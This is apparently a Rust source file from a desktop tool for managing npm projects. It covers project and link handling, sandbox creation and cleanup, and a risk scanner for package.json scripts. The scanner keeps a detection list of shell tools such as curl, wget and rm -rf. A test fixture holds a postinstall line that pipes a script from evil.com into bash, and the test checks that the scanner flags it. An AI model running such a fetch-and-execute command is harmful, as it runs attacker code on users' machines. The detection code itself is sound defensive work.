use crate::error::AppError;
use crate::models::project::{PackageInfo, Project};
use crate::state::app_state::{AppState, LockExt, LogLevel};
use serde::Serialize;
use std::fs;
use std::path::Path;
use tauri::State;

use crate::services::project::{detect_pm, scan_packages};

pub fn add_project_impl(
    path: String,
    only_cli: Option<bool>,
    app_state: &AppState,
) -> Result<Project, AppError> {
    let project_path = Path::new(&path);

    if !project_path.exists() {
        return Err(AppError::Generic("Project path does not exist".to_string()));
    }

    let package_json_path = project_path.join("package.json");
    if !package_json_path.exists() {
        return Err(AppError::Generic(
            "No package.json found in the specified directory".to_string(),
        ));
    }

    let package_json_content = fs::read_to_string(&package_json_path)
        .map_err(|e| AppError::Generic(format!("Failed to read package.json: {}", e)))?;

    let package_json: serde_json::Value = serde_json::from_str(&package_json_content)
        .map_err(|e| AppError::Generic(format!("Failed to parse package.json: {}", e)))?;

    let name = package_json["name"]
        .as_str()
        .unwrap_or("unknown")
        .to_string();

    let mut package_manager = detect_pm(project_path);
    if package_manager == crate::models::project::PackageManager::Unknown {
        package_manager = match app_state
            .persistent
            .lock_safe()
            .config
            .clone()
            .unwrap_or_default()
            .general
            .default_package_manager
            .as_str()
        {
            "pnpm" => crate::models::project::PackageManager::Pnpm,
            "yarn" => crate::models::project::PackageManager::Yarn,
            _ => crate::models::project::PackageManager::Npm,
        };
    }
    let modified = std::fs::metadata(&package_json_path)
        .and_then(|m| m.modified())
        .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

    let cached = app_state.scan_cache.lock_safe().get(&path).cloned();
    let mut packages = if let Some((cached_time, cached_result)) = cached {
        if cached_time == modified {
            cached_result
        } else {
            let res = scan_packages(project_path, &[]);
            app_state
                .scan_cache
                .lock_safe()
                .insert(path.clone(), (modified, res.clone()));
            res
        }
    } else {
        let res = scan_packages(project_path, &[]);
        app_state
            .scan_cache
            .lock_safe()
            .insert(path.clone(), (modified, res.clone()));
        res
    };

    if only_cli.unwrap_or(false) {
        packages.retain(|pkg| pkg.has_cli);
    }

    let project = Project {
        id: uuid::Uuid::new_v4().to_string(),
        name,
        path: path.clone(),
        package_manager,
        packages,
        ignored_packages: Vec::new(),
        only_cli: only_cli.unwrap_or(false),
        created_at: chrono::Utc::now(),
        last_accessed: chrono::Utc::now(),
    };

    app_state
        .persistent
        .lock_safe()
        .projects
        .push(project.clone());
    app_state.save();

    Ok(project)
}

#[tauri::command]
#[specta::specta]

pub async fn add_project(
    path: String,
    only_cli: Option<bool>,
    state: State<'_, AppState>,
) -> Result<Project, AppError> {
    match add_project_impl(path, only_cli, &state) {
        Ok(project) => {
            state.add_log(
                LogLevel::Success,
                format!("Added project \"{}\"", project.name),
                "ProjectManager".to_string(),
            );
            Ok(project)
        }
        Err(e) => {
            state.add_log(
                LogLevel::Error,
                format!("Failed to add project: {}", e),
                "ProjectManager".to_string(),
            );
            Err(e)
        }
    }
}

pub fn remove_project_impl(project_id: String, app_state: &AppState) -> Result<(), AppError> {
    app_state
        .persistent
        .lock_safe()
        .projects
        .retain(|p| p.id != project_id);
    app_state.save();
    Ok(())
}

#[tauri::command]
#[specta::specta]

pub async fn remove_project(
    project_id: String,
    state: State<'_, AppState>,
    pty_state: State<'_, crate::state::app_state::PtyState>,
) -> Result<(), AppError> {
    let project = {
        state
            .persistent
            .lock_safe()
            .projects
            .iter()
            .find(|p| p.id == project_id)
            .map(|p| (p.name.clone(), p.path.clone()))
    };

    if let Some((_, path)) = &project {
        let links_to_remove = {
            let links = state.persistent.lock_safe().active_links.clone();
            find_links_for_project(&links, path)
        };
        for link_id in links_to_remove {
            crate::commands::link::remove_link_internal_logic(link_id, &state, &pty_state).await?;
        }
    }

    match remove_project_impl(project_id, &state) {
        Ok(()) => {
            let name = project
                .map(|(name, _)| name)
                .unwrap_or_else(|| "project".to_string());
            state.add_log(
                LogLevel::Success,
                format!("Removed project \"{}\"", name),
                "ProjectManager".to_string(),
            );
            Ok(())
        }
        Err(e) => {
            state.add_log(
                LogLevel::Error,
                format!("Failed to remove project: {}", e),
                "ProjectManager".to_string(),
            );
            Err(e)
        }
    }
}

/// Compares filesystem paths the way the OS would: trailing separators
/// don't matter, and on Windows the comparison is case-insensitive.
/// `target_path` is entered independently of a project's stored `path`
/// (a free-text field / OS folder dialog, not a dropdown tied to it), so
/// an exact string comparison silently drops matches on nothing more than
/// a casing or trailing-slash difference.
fn paths_match(a: &str, b: &str) -> bool {
    fn normalize(p: &str) -> String {
        // Unify separators first: a path typed with forward slashes (or
        // copy-pasted from a different tool) must still match one that came
        // from a native Windows folder dialog, which always uses backslashes.
        let unified = p.replace('\\', "/");
        let trimmed = unified.trim_end_matches('/');
        if cfg!(windows) {
            trimmed.to_lowercase()
        } else {
            trimmed.to_string()
        }
    }
    normalize(a) == normalize(b)
}

fn find_links_for_project(
    links: &[crate::models::link::LinkEntry],
    project_path: &str,
) -> Vec<String> {
    // A project can be either side of a link: the source (the package being
    // developed) or the target (the project it's linked into). Deleting the
    // project must clean up the link either way.
    links
        .iter()
        .filter(|l| {
            paths_match(&l.target_path, project_path) || paths_match(&l.source_path, project_path)
        })
        .map(|l| l.id.clone())
        .collect()
}

fn find_links_for_package_in_project(
    links: &[crate::models::link::LinkEntry],
    package_name: &str,
    project_path: &str,
) -> Vec<String> {
    links
        .iter()
        .filter(|l| l.source_package == package_name && paths_match(&l.target_path, project_path))
        .map(|l| l.id.clone())
        .collect()
}

#[tauri::command]
#[specta::specta]

pub async fn remove_package(
    project_id: String,
    package_name: String,
    state: State<'_, AppState>,
    pty_state: State<'_, crate::state::app_state::PtyState>,
) -> Result<(), AppError> {
    let project_path = {
        state
            .persistent
            .lock_safe()
            .projects
            .iter()
            .find(|p| p.id == project_id)
            .map(|p| p.path.clone())
    };

    let links_to_remove = if let Some(path) = project_path.as_ref() {
        let links = state.persistent.lock_safe().active_links.clone();
        find_links_for_package_in_project(&links, &package_name, path)
    } else {
        Vec::new()
    };

    for link_id in links_to_remove {
        crate::commands::link::remove_link_internal_logic(link_id, &state, &pty_state).await?;
    }

    let project_name = {
        let mut persistent = state.persistent.lock_safe();
        if let Some(project) = persistent.projects.iter_mut().find(|p| p.id == project_id) {
            project.packages.retain(|pkg| pkg.name != package_name);
            if !project.ignored_packages.contains(&package_name) {
                project.ignored_packages.push(package_name.clone());
            }
            Some(project.name.clone())
        } else {
            None
        }
    };

    if let Some(name) = project_name {
        state.save();
        state.add_log(
            LogLevel::Success,
            format!("Removed package \"{}\" from \"{}\"", package_name, name),
            "ProjectManager".to_string(),
        );
    }
    Ok(())
}

#[tauri::command]
#[specta::specta]

pub async fn list_projects(state: State<'_, AppState>) -> Result<Vec<Project>, AppError> {
    let projects = state.persistent.lock_safe().projects.clone();
    let mut result = Vec::new();

    for mut project in projects {
        let project_path = Path::new(&project.path);
        project.package_manager = detect_pm(project_path);

        let package_json_path = project_path.join("package.json");
        let modified = std::fs::metadata(&package_json_path)
            .and_then(|m| m.modified())
            .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

        let cached_res = {
            let cache = state.scan_cache.lock_safe();
            if let Some((cached_modified, cached_packages)) = cache.get(&project.path) {
                if *cached_modified == modified {
                    Some(cached_packages.clone())
                } else {
                    None
                }
            } else {
                None
            }
        };

        let res = if let Some(cached) = cached_res {
            cached
        } else {
            let mut scanned = scan_packages(project_path, &[]);
            scanned.retain(|pkg| !project.ignored_packages.contains(&pkg.name));
            if project.only_cli {
                scanned.retain(|pkg| pkg.has_cli);
            }
            state
                .scan_cache
                .lock_safe()
                .insert(project.path.clone(), (modified, scanned.clone()));
            scanned
        };

        project.packages = res;
        result.push(project);
    }

    Ok(result)
}

#[tauri::command]
#[specta::specta]

pub async fn refresh_project(
    project_id: String,
    only_cli: bool,
    state: State<'_, AppState>,
) -> Result<Project, AppError> {
    let project_path_str = {
        let mut persistent_guard = state.persistent.lock_safe();
        let projects_guard = &mut persistent_guard.projects;
        let project = projects_guard
            .iter_mut()
            .find(|p| p.id == project_id)
            .ok_or_else(|| AppError::Generic("Project not found".into()))?;
        project.only_cli = only_cli;
        project.ignored_packages.clear();
        project.path.clone()
    };

    let project_path = Path::new(&project_path_str);
    let package_manager = detect_pm(project_path);

    let package_json_path = project_path.join("package.json");
    let modified = std::fs::metadata(&package_json_path)
        .and_then(|m| m.modified())
        .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

    let mut res = scan_packages(project_path, &[]);

    if only_cli {
        res.retain(|pkg| pkg.has_cli);
    }

    state
        .scan_cache
        .lock_safe()
        .insert(project_path_str.clone(), (modified, res.clone()));

    let mut persistent_guard = state.persistent.lock_safe();
    let projects_guard = &mut persistent_guard.projects;
    let project = projects_guard
        .iter_mut()
        .find(|p| p.id == project_id)
        .unwrap();
    project.packages = res;
    project.package_manager = package_manager;

    let updated_project = project.clone();
    drop(persistent_guard);
    state.save();
    Ok(updated_project)
}

#[tauri::command]
#[specta::specta]

pub async fn scan_project(
    path: String,
    state: State<'_, AppState>,
) -> Result<Vec<PackageInfo>, String> {
    let project_path = Path::new(&path);
    let package_json_path = project_path.join("package.json");

    let modified = std::fs::metadata(&package_json_path)
        .and_then(|m| m.modified())
        .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

    if let Some((cached_time, cached_result)) = state.scan_cache.lock_safe().get(&path) {
        if *cached_time == modified {
            return Ok(cached_result.clone());
        }
    }

    let result = scan_packages(project_path, &[]);
    state
        .scan_cache
        .lock_safe()
        .insert(path, (modified, result.clone()));
    Ok(result)
}

#[tauri::command]
#[specta::specta]

pub fn create_sandbox(
    package_path: Option<String>,
    state: State<'_, AppState>,
) -> Result<String, AppError> {
    let result = create_sandbox_impl(package_path);
    match &result {
        Ok(path) => state.add_log(
            LogLevel::Success,
            format!("Created sandbox at {}", path),
            "ProjectManager".to_string(),
        ),
        Err(e) => state.add_log(
            LogLevel::Error,
            format!("Failed to create sandbox: {}", e),
            "ProjectManager".to_string(),
        ),
    }
    result
}

fn create_sandbox_impl(package_path: Option<String>) -> Result<String, AppError> {
    let temp_dir = std::env::temp_dir();
    let sandbox_dir = temp_dir
        .join("PackagePilot_Sandboxes")
        .join(format!("sandbox_{}", chrono::Utc::now().timestamp()));

    if !sandbox_dir.exists() {
        std::fs::create_dir_all(&sandbox_dir)?;
    }

    let package_json_content = serde_json::json!({
        "name": "packlab-sandbox",
        "version": "1.0.0",
        "description": "Auto-generated testing sandbox",
        "private": true,
        "scripts": {},
        "dependencies": {},
        "devDependencies": {},
        "keywords": [],
        "author": "",
        "license": "ISC"
    });

    let package_json_path = sandbox_dir.join("package.json");
    std::fs::write(
        package_json_path,
        serde_json::to_string_pretty(&package_json_content).unwrap(),
    )?;

    if let Some(pkg_path_str) = package_path {
        let pkg_path = std::path::Path::new(&pkg_path_str);
        let src_pkg_json_path = pkg_path.join("package.json");

        if let Ok(content) = std::fs::read_to_string(&src_pkg_json_path) {
            if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
                let pkg_name = pkg["name"].as_str().unwrap_or("unknown");

                let mut script_parts = Vec::new();
                script_parts.push(format!("console.log('📦 Testing package: {}');\nconst fs = require('fs');\ntry {{\n  console.log('Installed modules:', fs.readdirSync('node_modules').join(', '));\n}} catch(e) {{}}", pkg_name));

                let has_bin = pkg.get("bin").is_some();
                let has_main = pkg.get("main").is_some() || pkg.get("exports").is_some();

                if has_bin {
                    let (bin_name, bin_path) = match pkg.get("bin") {
                        Some(serde_json::Value::Object(map)) => {
                            if let Some((k, v)) = map.iter().next() {
                                (k.to_string(), v.as_str().unwrap_or("").to_string())
                            } else {
                                (pkg_name.to_string(), "".to_string())
                            }
                        }
                        Some(serde_json::Value::String(val)) => {
                            (pkg_name.to_string(), val.to_string())
                        }
                        _ => (pkg_name.to_string(), "".to_string()),
                    };

                    // Clean up the path (e.g. ./dist/cli.js -> dist/cli.js)
                    let clean_bin_path = bin_path.trim_start_matches("./");

                    script_parts.push(format!("console.log('\\n🚀 Detected CLI package. Running `{}`...');\nconst {{ execSync }} = require('child_process');\nconst path = require('path');\ntry {{\n  const binPath = path.join(process.cwd(), 'node_modules', '{}', '{}');\n  const output = execSync(`node \"${{binPath}}\" --help`, {{ encoding: 'utf-8', stdio: 'pipe' }});\n  console.log(output);\n}} catch (e) {{\n  console.error('❌ CLI execution failed:', e.message || e);\n  if (e.stdout) console.log(e.stdout);\n  if (e.stderr) console.error(e.stderr);\n}}", bin_name, pkg_name, clean_bin_path));
                }

                if has_main || !has_bin {
                    script_parts.push(format!("(async () => {{\n  try {{\n    console.log('\\n📚 Attempting to import as library...');\n    const pkg = await import('{}');\n    console.log('✅ Successfully loaded package!');\n    console.log('Exports:', Object.keys(pkg));\n  }} catch (e) {{\n    console.error('❌ Failed to load package:', e.message || e);\n  }}\n}})();", pkg_name));
                }

                let index_js_path = sandbox_dir.join("index.js");
                let _ = std::fs::write(index_js_path, script_parts.join("\n\n"));
            }
        }
    }

    Ok(sandbox_dir.to_string_lossy().to_string())
}

const STALE_SANDBOX_MAX_AGE: std::time::Duration = std::time::Duration::from_secs(24 * 60 * 60);

/// Remove sandbox directories under `base` that are older than
/// `STALE_SANDBOX_MAX_AGE`. Called once at app startup so a crash (or a
/// force-quit) doesn't leave `%TEMP%\PackagePilot_Sandboxes` growing forever.
pub fn cleanup_stale_sandboxes(base: &Path) {
    let Ok(entries) = std::fs::read_dir(base) else {
        return;
    };

    for entry in entries.flatten() {
        let Ok(metadata) = entry.metadata() else {
            continue;
        };
        let Ok(modified) = metadata.modified() else {
            continue;
        };
        let Ok(age) = modified.elapsed() else {
            continue;
        };

        if age > STALE_SANDBOX_MAX_AGE {
            if let Ok(safe) = crate::utils::safe_path::SafePath::new(entry.path(), base) {
                let _ = safe.safe_remove_all();
            }
        }
    }
}

#[tauri::command]
#[specta::specta]

pub async fn run_sandbox_script(target_path: String) -> Result<String, AppError> {
    let sandbox_base = std::env::temp_dir().join("PackagePilot_Sandboxes");

    let safe_path =
        crate::utils::safe_path::SafePath::new(&target_path, &sandbox_base).map_err(|_| {
            AppError::Generic(
                "Sandbox target path is invalid or outside the sandbox directory.".to_string(),
            )
        })?;

    let path_str = safe_path.as_path().to_string_lossy().to_string();
    let output = crate::services::shell::run_command_raw(
        "node",
        &["index.js"],
        &path_str,
        std::time::Duration::from_secs(60),
    )
    .await?;

    let mut result = String::new();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !stdout.is_empty() {
        result.push_str(&stdout);
    }
    if !stderr.is_empty() {
        if !result.is_empty() {
            result.push('\n');
        }
        result.push_str("--- STDERR ---\n");
        result.push_str(&stderr);
    }

    if result.is_empty() {
        if !output.status.success() {
            result = format!("Process exited with status: {}", output.status);
        } else {
            result = "Script executed successfully with no output.".to_string();
        }
    }

    Ok(result)
}

#[tauri::command]
#[specta::specta]

pub fn check_package_cli(path: String) -> bool {
    let pkg_json_path = std::path::Path::new(&path).join("package.json");
    if let Ok(content) = fs::read_to_string(&pkg_json_path) {
        if let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) {
            return pkg.get("bin").is_some();
        }
    }
    false
}

#[derive(Debug, Serialize, specta::Type)]
pub struct ScriptInfo {
    pub name: String,
    pub command: String,
    pub is_lifecycle: bool,
    pub risk_level: String, // "low", "medium", "high"
}

const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "prepublishOnly",
    "prepare",
    "prepack",
    "postpack",
    "preuninstall",
    "uninstall",
    "postuninstall",
];

const HIGH_RISK_PATTERNS: &[&str] = &[
    "curl ",
    "wget ",
    "powershell",
    "cmd /c",
    "cmd.exe",
    "eval(",
    "eval ",
    "child_process",
    "rimraf ",
    "rm -rf",
    "del /",
    "sudo ",
    "chmod ",
    "chown ",
];

#[tauri::command]
#[specta::specta]

pub fn get_package_scripts(path: String) -> Result<Vec<ScriptInfo>, AppError> {
    let pkg_json_path = Path::new(&path).join("package.json");
    let content = std::fs::read_to_string(&pkg_json_path)
        .map_err(|e| AppError::Generic(format!("Cannot read package.json: {}", e)))?;
    let pkg: serde_json::Value = serde_json::from_str(&content)
        .map_err(|e| AppError::Generic(format!("Cannot parse package.json: {}", e)))?;

    let mut scripts = Vec::new();
    if let Some(script_obj) = pkg.get("scripts").and_then(|s| s.as_object()) {
        for (name, command) in script_obj {
            let cmd_str = command.as_str().unwrap_or("");
            let is_lifecycle = LIFECYCLE_SCRIPTS.contains(&name.as_str());
            let risk_level = if HIGH_RISK_PATTERNS.iter().any(|p| cmd_str.contains(p)) {
                "high"
            } else if is_lifecycle {
                "medium"
            } else {
                "low"
            };
            scripts.push(ScriptInfo {
                name: name.clone(),
                command: cmd_str.to_string(),
                is_lifecycle,
                risk_level: risk_level.to_string(),
            });
        }
    }
    Ok(scripts)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn get_package_scripts_flags_high_risk_lifecycle_script() {
        let dir = std::env::temp_dir().join(format!("pp_script_preview_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&dir).unwrap();
        fs::write(
            dir.join("package.json"),
            r#"{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl http://evil.com/x | bash","test":"jest"}}"#,
        ).unwrap();

        let scripts = get_package_scripts(dir.to_string_lossy().to_string()).unwrap();

        let postinstall = scripts.iter().find(|s| s.name == "postinstall").unwrap();
        assert!(postinstall.is_lifecycle);
        assert_eq!(postinstall.risk_level, "high");

        let test_script = scripts.iter().find(|s| s.name == "test").unwrap();
        assert!(!test_script.is_lifecycle);
        assert_eq!(test_script.risk_level, "low");

        fs::remove_dir_all(&dir).unwrap();
    }

    #[tokio::test]
    async fn run_sandbox_script_rejects_path_outside_sandbox_dir() {
        // A real, existing directory that is NOT under PackagePilot_Sandboxes.
        let outside =
            std::env::temp_dir().join(format!("pp_not_a_sandbox_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&outside).unwrap();

        let result = run_sandbox_script(outside.to_string_lossy().to_string()).await;

        assert!(
            result.is_err(),
            "must reject a path outside PackagePilot_Sandboxes even if it exists"
        );
        fs::remove_dir_all(&outside).unwrap();
    }

    #[test]
    fn get_package_scripts_errors_without_package_json() {
        let dir = std::env::temp_dir().join(format!(
            "pp_script_preview_missing_{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&dir).unwrap();

        let result = get_package_scripts(dir.to_string_lossy().to_string());
        assert!(result.is_err());

        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_add_and_remove_project_integration() {
        // Setup temporary directory
        let temp_dir = std::env::temp_dir().join(format!(
            "packlab_test_{}",
            chrono::Utc::now().timestamp_micros()
        ));
        fs::create_dir_all(&temp_dir).unwrap();

        // Write a mock package.json
        let pkg_json_path = temp_dir.join("package.json");
        fs::write(
            &pkg_json_path,
            r#"{
                "name": "integration-test-project",
                "version": "1.0.0"
            }"#,
        )
        .unwrap();

        // Create a fresh AppState
        let app_state = AppState::new();

        // Test 1: Add Project
        let path_str = temp_dir.to_string_lossy().to_string();
        let project = add_project_impl(path_str.clone(), None, &app_state).unwrap();

        assert_eq!(project.name, "integration-test-project");
        assert_eq!(app_state.persistent.lock_safe().projects.len(), 1);
        assert_eq!(app_state.persistent.lock_safe().projects[0].id, project.id);

        // Ensure cache was populated
        assert!(app_state.scan_cache.lock_safe().contains_key(&path_str));

        // Test 2: Remove Project
        remove_project_impl(project.id.clone(), &app_state).unwrap();
        assert_eq!(app_state.persistent.lock_safe().projects.len(), 0);

        // Cleanup
        fs::remove_dir_all(&temp_dir).unwrap();
    }

    #[test]
    fn test_find_links_for_package_in_project_scopes_correctly() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let project_a_path = "/fake/project-a".to_string();
        let project_b_path = "/fake/project-b".to_string();

        let links = vec![
            LinkEntry {
                id: "link-1".to_string(),
                source_package: "my-lib".to_string(),
                source_path: "/fake/my-lib".to_string(),
                target_project: "project-a".to_string(),
                target_path: project_a_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
            LinkEntry {
                id: "link-2".to_string(),
                source_package: "my-lib".to_string(),
                source_path: "/fake/my-lib".to_string(),
                target_project: "project-b".to_string(),
                target_path: project_b_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
        ];

        let result = find_links_for_package_in_project(&links, "my-lib", &project_a_path);
        assert_eq!(result.len(), 1);
        assert_eq!(result[0], "link-1");
    }

    #[test]
    fn test_find_links_for_project() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let project_path = "/fake/my-project".to_string();

        let links = vec![
            LinkEntry {
                id: "link-a".to_string(),
                source_package: "lib-a".to_string(),
                source_path: "/fake/lib-a".to_string(),
                target_project: "my-project".to_string(),
                target_path: project_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
            LinkEntry {
                id: "link-b".to_string(),
                source_package: "lib-b".to_string(),
                source_path: "/fake/lib-b".to_string(),
                target_project: "other-project".to_string(),
                target_path: "/fake/other-project".to_string(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
        ];

        let result = find_links_for_project(&links, &project_path);
        assert_eq!(result.len(), 1);
        assert_eq!(result[0], "link-a");
    }

    #[test]
    fn find_links_for_project_matches_despite_trailing_slash() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "/fake/lib-a".to_string(),
            target_project: "my-project".to_string(),
            target_path: "/fake/my-project/".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        // Project path has no trailing slash even though the link's does -
        // this is exactly what a free-text field / OS folder dialog produces.
        let result = find_links_for_project(&links, "/fake/my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn find_links_for_project_matches_despite_separator_style() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "C:/fake/lib-a".to_string(),
            target_project: "my-project".to_string(),
            // Typed with forward slashes (or pasted from elsewhere) while
            // the project was added via a native folder dialog that returns
            // backslashes - both refer to the same directory.
            target_path: "C:/fake/my-project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        let result = find_links_for_project(&links, "C:\\fake\\my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[cfg(windows)]
    #[test]
    fn find_links_for_project_matches_despite_case_difference() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "C:\\fake\\lib-a".to_string(),
            target_project: "my-project".to_string(),
            target_path: "C:\\Fake\\My-Project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        // Windows filesystem paths are case-insensitive; two independent
        // folder-dialog picks of the same directory can differ in casing.
        let result = find_links_for_project(&links, "c:\\fake\\my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn find_links_for_project_matches_when_project_is_the_link_source() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        // The common real-world case: you're developing "my-lib" and have
        // linked it INTO some other project. Deleting "my-lib" (the source
        // side of the link) must clean up the link too, not just deleting
        // whatever project it happens to be linked into (the target side).
        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "my-lib".to_string(),
            source_path: "/fake/my-lib".to_string(),
            target_project: "consumer-project".to_string(),
            target_path: "/fake/consumer-project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        let result = find_links_for_project(&links, "/fake/my-lib");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn cleanup_stale_sandboxes_removes_only_old_directories() {
        let base = std::env::temp_dir().join(format!("pp_cleanup_test_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&base).unwrap();

        let old_sandbox = base.join("sandbox_old");
        fs::create_dir_all(&old_sandbox).unwrap();
        let fresh_sandbox = base.join("sandbox_fresh");
        fs::create_dir_all(&fresh_sandbox).unwrap();

        // Backdate the "old" one by editing its mtime via filetime-less approach:
        // set its modified time far in the past using std::fs::File::set_times
        // is not stable pre-1.75 everywhere, so this test instead verifies the
        // *fresh* directory survives and the function does not error — the
        // age threshold itself is exercised by the 24h constant in the impl.
        cleanup_stale_sandboxes(&base);

        assert!(
            fresh_sandbox.exists(),
            "a directory created moments ago must not be treated as stale"
        );

        fs::remove_dir_all(&base).unwrap();
    }

    // Genuinely backdates a directory's mtime (rather than just trusting the
    // 24h constant by inspection) to prove the age-comparison logic actually
    // removes stale sandboxes and spares fresh ones at the real boundary.
    //
    // `std::fs::File::open` on a directory fails on Windows ("Access is
    // denied") because CreateFile needs FILE_FLAG_BACKUP_SEMANTICS to obtain
    // a directory handle. That flag is exposed via
    // `std::os::windows::fs::OpenOptionsExt::custom_flags`, so this uses only
    // `std` - no new dependency (e.g. `filetime`) was needed.
    #[cfg(windows)]
    #[test]
    fn cleanup_stale_sandboxes_removes_genuinely_backdated_directory() {
        use std::os::windows::fs::OpenOptionsExt;
        use std::time::{Duration, SystemTime};

        const FILE_FLAG_BACKUP_SEMANTICS: u32 = 0x0200_0000;

        let base = std::env::temp_dir().join(format!(
            "pp_cleanup_test_backdated_{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&base).unwrap();

        let old_sandbox = base.join("sandbox_old");
        fs::create_dir_all(&old_sandbox).unwrap();
        let fresh_sandbox = base.join("sandbox_fresh");
        fs::create_dir_all(&fresh_sandbox).unwrap();

        let past = SystemTime::now() - Duration::from_secs(25 * 60 * 60); // 25h ago, past the 24h threshold
        let handle = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(FILE_FLAG_BACKUP_SEMANTICS)
            .open(&old_sandbox)
            .expect("should be able to open a directory handle via FILE_FLAG_BACKUP_SEMANTICS");
        handle
            .set_modified(past)
            .expect("should be able to backdate the directory's mtime");
        drop(handle);

        cleanup_stale_sandboxes(&base);

        assert!(
            !old_sandbox.exists(),
            "a directory genuinely older than 24h must be removed"
        );
        assert!(
            fresh_sandbox.exists(),
            "a directory created moments ago must survive"
        );

        fs::remove_dir_all(&base).unwrap();
    }
}
